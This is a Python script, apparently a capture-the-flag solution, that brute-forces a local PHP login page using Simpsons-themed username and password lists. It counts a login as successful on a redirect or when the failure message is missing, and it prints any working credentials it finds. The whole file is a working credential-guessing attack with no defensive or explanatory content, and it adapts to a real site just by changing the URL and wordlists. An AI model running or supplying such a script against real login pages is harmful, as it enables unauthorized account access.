import requests
import time

# Configuration
target_url = "http://127.0.0.1:32829/index.php"
timeout = 3

# Simpsons/Springfield themed wordlists
usernames = [
    "homer", "bart", "lisa", "marge", "maggie", "ned", "flanders",
    "apu", "krusty", "skinner", "springfield", "admin", "root"
]

passwords = [
    "springfield", "simpsons", "password", "homer", "bart", "nuclear",
    "duff", "donut", "kwikimart", "ayecaramba", "excellent",
    "okilydokily", "flanders"
]

# Successful login should NOT contain this message
FAILURE_INDICATOR = "Access Restricted to Internal Employees only"

# Track attempts
total_attempts = len(usernames) * len(passwords)
attempt_number = 0
successful_credentials = []
print(f"[+] Starting credential brute force on {target_url}")
print(f"[+] Total combinations to test: {total_attempts}")
print(f"[+] Timeout: {timeout} seconds per request\n")

# Try all combinations
for username in usernames:
    for password in passwords:
        attempt_number += 1
        print(f"[{attempt_number}/{total_attempts}] Testing: {username}:{password}")
        
        try:
            # Prepare POST data
            data = {
                'username': username,
                'password': password
            }
            
            # Make the request with timeout
            response = requests.post(
                target_url,
                data=data,
                timeout=timeout,
                allow_redirects=False  # Don't follow redirects automatically
            )
            
            # Check if login was successful
            # Success if: redirect (302) OR response doesn't contain failure indicator
            if response.status_code == 302:
                print(f"[!] SUCCESS! Credentials found: {username}:{password}")
                print(f"[!] Server responded with redirect (302) to: {response.headers.get('Location', 'unknown')}")
                successful_credentials.append((username, password))
                continue  # Continue testing other combinations
            elif FAILURE_INDICATOR not in response.text:
                print(f"[!] SUCCESS! Credentials found: {username}:{password}")
                print(f"[!] Response does not contain failure indicator")
                successful_credentials.append((username, password))
                continue  # Continue testing other combinations
            else:
                # Failed login - contains failure message
                print(f"[-] Failed: Access Restricted to Internal Employees only\n")
                
        except requests.exceptions.Timeout:
            print(f"[-] Timeout after {timeout} seconds")
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - target may be unreachable")
        except Exception as e:
            print(f"[-] Error: {str(e)}")
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)

# Final summary
print("\n" + "="*70)
print("BRUTE FORCE ATTACK COMPLETED")
print("="*70)
print(f"Total attempts: {attempt_number}")
print(f"Successful credentials found: {len(successful_credentials)}")

if successful_credentials:
    print("\n[!] WORKING CREDENTIALS:")
    for username, password in successful_credentials:
        print(f"    - Username: {username}")
        print(f"    - Password: {password}")
        print("    " + "-" * 50)
else:
    print("\n[-] No successful credentials found with the provided wordlists")

print("\n[*] Note: If login worked but no FLAG found, check other pages/endpoints")

